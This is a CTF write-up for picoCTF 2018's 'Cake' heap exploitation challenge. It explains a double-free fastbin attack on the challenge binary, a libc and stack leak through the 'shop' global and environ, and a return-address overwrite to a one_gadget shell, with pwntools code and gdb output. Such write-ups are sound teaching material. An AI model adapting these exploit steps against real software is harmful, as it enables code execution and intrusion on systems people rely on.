# Cake
**Category:** Binary Exploitation

**Points:** 900

**Description:** 
Now that you're a professional heap baker, can you pwn this for us? It should be a piece of cake. Connect with `nc 2018shell2.picoctf.com 54086`. [libc.so.6](https://2018shell2.picoctf.com/static/397794d1487f1c94583fbf0437799b5d/libc.so.6)

----------

## Solution

### Notes
I got a lot of core dumps during this process of trial and error, and the following made my debugging life so much easier.

* Make sure the provided `libc` is *NOT* in the current directory; you will actually lose debug symbols by doing so. Just use `libc.so.6` from the system path on the shell server.

* Also, having a copy of `malloc.c` from `glibc` version 2.23 is very helpful.

### Initial Observations

Like other picoCTF binary exploit problems, compiler optimization is disabled. Given the relatively simple logic of the program, decompiling by hand isn’t too bad. You can find the source code [here](https://github.com/jespiron/picoCTF-2018/blob/master/binary/cake/cake.c), of which I omitted some parts.

Upon serving the same cake twice, we find a crash due to a double-free bug. This gives us the opportunity for a `fastbin` attack.

Our exploit will have something to do with the global variable `shop`, the `0x20` byte memory chunks allocated by `make()`, and `inspect()`.

### Leaking the return address
We first need to get the `libc` address. After that, we can get the stack address via `libc.environ`, according to [this guy](https://github.com/Naetw/CTF-pwn-tips).

This program uses `stdin`, which points to `_IO_2_1_stdin_` in libc.

```
(gdb) x/4gx 0x6030d0
0x6030d0 <stdin@@GLIBC_2.2.5>:  <b>0x00007ffff7dd18e0</b>      0x0000000000000000
0x6030e0 <shop>:        0x0000000000000000      0x0000000000000000
(gdb) x/2gx 0x00007ffff7dd18e0
0x7ffff7dd18e0 <<b>_IO_2_1_stdin_</b>>:        0x00000000fbad2088      0x0000000000000000
```

We have indirect control over `shop + 0x00` (total sales) and `shop + 0x08` (number of customers waiting).

Initially, I tried `shop + 0x00`. I got the leak, but wound up having a corrupted chunk in `fastbin` I lost control of. As a result, the subsequent `malloc` calls resulted in a crash. Thus, we will use `shop + 0x08` instead.

I used the following code to get the address of the `cake` symbols and the pre-ASLR addresses of the `libc` symbols.

```python
cake = ELF(“./cake”)

shop = cake.symbols['shop']
stdin = cake.symbols['stdin']

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

file_IO_2_1_stdin_ = libc.symbols['_IO_2_1_stdin_']
file_environ = libc.symbols['environ']
file_libc_text = libc.get_section_by_name('.text').header.sh_addr
```

First, we prepare a fake chunk for `fastbin`. The size of all of the malloc requests are hardcoded as 0x10 bytes and fall into `fastbin[0]`. Hence, we must keep `shop + 0x8` in the range of `0x20`-`0x2f`. We're allowed up to `0x2f` because `malloc` ignores the lower 4 bits when allocating from `fastbin`.

For every line of input to `main`, there is a $`\frac{1}{3}`$ chance of receiving a new customer. Therefore, we will need at least `96` arbitrary commands to get `0x20` customers. 
However, due to the `serve()` command, we must take into account of decrementing the customer headcount.

Through some trial and error, I used 108 `“T”` commands, but any other invalid cake command would work too. I didn’t use the valid `“W”` command, since it called `spin()`, which took up time.

```python
conn.send("T\n" * 108)
for i in range(109):
    wait_prompt()
```

Next, we follow the logic in `fastbin_dup.c` from https://github.com/shellphish/how2heap.

```python
c0 = make_cake(0x0, p64(0x0))  # chunk_0
c1 = make_cake(0x0, '')  # chunk_1
serve(c0)  # fastbin[0] -> chunk_0
serve(c1)  # fastbin[0] -> chunk_1 -> chunk_0
serve(c0)  # fastbin[0] -> chunk_0 -> chunk_1 -> chunk_0
chunk_1 = inspect(c0)
chunk_0 = inspect(c1)
```

Third, we link our fake chunk `shop` into `fastbin`.
```python
c2 = make_cake(shop, p64(0x0))   # malloc return chunk_0
c3 = make_cake(0x0, '')          # malloc return chunk_1
c4 = make_cake(shop, p64(0x21))  # malloc return chunk_0
```

As shown in the debugger, `shop` is now in `fastbin`. Because the debug symbols are available, we can just use C-like syntax to check `fastbin`'s values.

```
(gdb) print main_arena.fastbinsY[0]
$3 = (mfastbinptr) 0x6030e0 <shop>
```

Consequently, `malloc` will return `shop + 0x10` when we make our next `cake` request.

We set its name to `"stdin"`. This will place the address of `"stdin"` into `shop + 0x18`, which corresponds to `cake` 1.

```python
c5 = make_cake(shop, p64(stdin))
_IO_2_1_stdin_ = inspect(1)  # read the address from cake #1

libc_reloc_delta = _IO_2_1_stdin_ - file_IO_2_1_stdin_
libc_text = libc_reloc_delta + file_libc_text
libc_environ = libc_reloc_delta + file_environ
```
We set its price to `shop` to create a circular singly linked list (depicted below).
```
   shop + 0x00 -> value doesn’t matter
   shop + 0x08 -> must be in the range of 0x20 ~ 0x2f
   shop + 0x10 -> fd (next free chunk) points to shop!
   shop + 0x18 -> use for leaking
```

Let’s look at what `fastbin` has now. As expected, `fastbin[0]` has `chunk_0`’s address, so we need the `0x21` in `c4 = make_cake(shop, p64(0x21))` to pass the `malloc` chunk size validation for making `c6` later.

```
(gdb) print main_arena.fastbinsY[0]
$1 = (mfastbinptr) 0x156e020
(gdb) x/2gx 0x156e020
0x156e020:      0x00000000006030e0      0x0000000000000021
(gdb) x/8gx &shop
0x6030e0 <shop>:        0x0000000000000000      0x0000000000000021
0x6030f0 <shop+16>:     0x00000000006030e0      0x00000000006030d0
0x603100 <shop+32>:     0x000000000156e020      0x000000000156e040
0x603110 <shop+48>:     0x000000000156e020      0x00000000006030f0
```
Let’s get the corrupted `chunk_0` off of `fastbin`. It is corrupted because it points to `chunk_0`’s user space instead of `malloc`’s chunk header (`0x10` bytes ahead of the user space).

We make `c6`, which succeeds thanks to the `0x21` when making `c4`.

Because of the corruption, `malloc` will return `chunk_0 + 0x10` for making `c6`, which is the header of `chunk_1`. We shouldn't change `chunk_1`’s header, so we use its original value of `0x21` in order for another subsequent `malloc` (not mentioned here) to succeed.

```python
c6 = make_cake(0x0, p64(0x21))  # chunk_0 + 0x10
```

Next, we use `libc.environ` to leak the stack address. Again, we utilize the `fastbin` trick to add our faked circular chunk `shop` into `fastbin`. `shop + 0x10` has the desired value, 
`shop`, pointing to its own chunk header. Therefore, after this round, `fastbin[0]` will return `shop + 0x10` so as long as `shop + 0x8` remains in the range of `0x20`-`0x2f`.

### Redirecting to one_gadget by changing the return address of the main function

Let’s take a look at the `make()` function again. It first overwrites the second 8-byte block of the newly allocated memory for `name`, then the first 8-byte block for `price`.

Note that it doesn’t keep the address of the newly allocated memory in a register. It always reads from memory due to compiler optimization being disabled. This gives us the opportunity to overwrite the memory for holding the newly allocated address during the first 8-byte read for `name`. When the program reads in the price, it will write into the location we set for the `name`.

```
   0x0000000000400c0b <+207>:   mov    -0x28(%rbp),%rax
   0x0000000000400c0f <+211>:   mov    -0x14(%rbp),%edx
   0x0000000000400c12 <+214>:   movslq %edx,%rdx
   0x0000000000400c15 <+217>:   add    $0x2,%rdx
   0x0000000000400c19 <+221>:   mov    (%rax,%rdx,8),%rax
   0x0000000000400c1d <+225>:   add    $0x8,%rax
   0x0000000000400c21 <+229>:   mov    $0x8,%esi
   0x0000000000400c26 <+234>:   mov    %rax,%rdi
   0x0000000000400c29 <+237>:   callq  0x400a99 <fgets_eat>
...
   0x0000000000400c3d <+257>:   mov    -0x28(%rbp),%rax
   0x0000000000400c41 <+261>:   mov    -0x14(%rbp),%edx
   0x0000000000400c44 <+264>:   movslq %edx,%rdx
   0x0000000000400c47 <+267>:   add    $0x2,%rdx
   0x0000000000400c4b <+271>:   mov    (%rax,%rdx,8),%rbx
   0x0000000000400c4f <+275>:   mov    $0x0,%eax
   0x0000000000400c54 <+280>:   callq  0x400a40 <get>
   0x0000000000400c59 <+285>:   mov    %rax,(%rbx)0x603110 <shop+48>:     
```
For this to work, we need to make sure the new `cake` is stored in slot 1 so that `shop + 0x18` will point to `shop + 0x10` (remember that we tricked `malloc` to always return `shop + 0x10`).

The second 8-byte block of `shop + 0x10` is `shop + 0x18`. As a result, reading in `name` will overwrite slot 1 itself.
To achieve this, just set `shop + 0x18` to `NULL`. We can do this because `malloc` always returns `shop + 0x10`.

```python
c11 = make_cake(shop, p64(0))
```

We set the return address of the `main` function to the `one_gadget` address* in `libc`. Once we close the shop, we get into the shell.

```python
c1 = make_cake(one_gadget, p64(main_return_address))
conn.send("C\n")
```

*I found the `one_gadget` address using [this handy tool](https://github.com/david942j/one_gadget)! I picked `0x45216` because the `main` function returns `0`, thus satisfying the stated `one_gadget` constraint of `rax` being `null`.
